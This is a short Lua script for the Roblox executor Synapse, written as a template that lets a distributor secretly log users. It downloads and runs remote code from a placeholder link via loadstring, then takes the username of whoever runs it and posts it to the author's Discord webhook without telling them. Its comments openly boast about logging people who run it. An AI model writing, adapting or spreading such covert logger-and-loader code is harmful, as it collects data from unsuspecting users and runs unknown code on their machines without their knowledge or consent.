local webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL' -- You cannot mess this up boi 

-- You know exactly what this function is for because just look at the name, LOOK AT IT!
local function logUsername(username)
    local message = 'User logged: ' .. username

    -- Where it sends the message, VIA DISCORD WEBHOOOOOOOK
    local data = {
        content = message
    }

    local encodedData = game:GetService('HttpService'):JSONEncode(data)

    syn.request({
        Url = webhookUrl,
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = encodedData
    })
end

loadstring(game:HttpGet("Link"))() -- Add your link here, and log all those mfs.

-- If you don't know, this GETS the player username after executing the loadstring :D
local playerName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name

-- This is where the username gets logged.
if playerName then
    logUsername(playerName)
end
